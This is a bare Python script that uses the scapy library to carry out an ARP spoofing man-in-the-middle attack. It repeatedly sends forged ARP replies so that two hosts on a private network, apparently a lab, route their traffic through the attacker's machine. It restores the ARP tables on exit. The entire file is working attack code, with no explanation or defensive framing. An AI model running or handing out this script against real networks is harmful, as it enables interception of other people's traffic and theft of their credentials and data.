#!/usr/bin/env python
import sys
import time
import scapy.all as scapy


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_boardcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_boardcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op =2, pdst = target_ip,  hwdst= target_mac, psrc = spoof_ip)
    scapy.send(packet, verbose = False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op =2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip , hwsrc = source_mac)
    scapy.send(packet, count = 4,  verbose = False)

send_packet = 0
try:
    while True:
        spoof("192.168.233.149", "192.168.233.2")
        spoof("192.168.233.2", "192.168.233.149")
        send_packet = send_packet+2
        print("\r[+] Packet sent : " + str(send_packet), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Restoring IP.... Plesase wait..")
    restore("192.168.233.149", "192.168.233.2")
    print("[+] IP restored")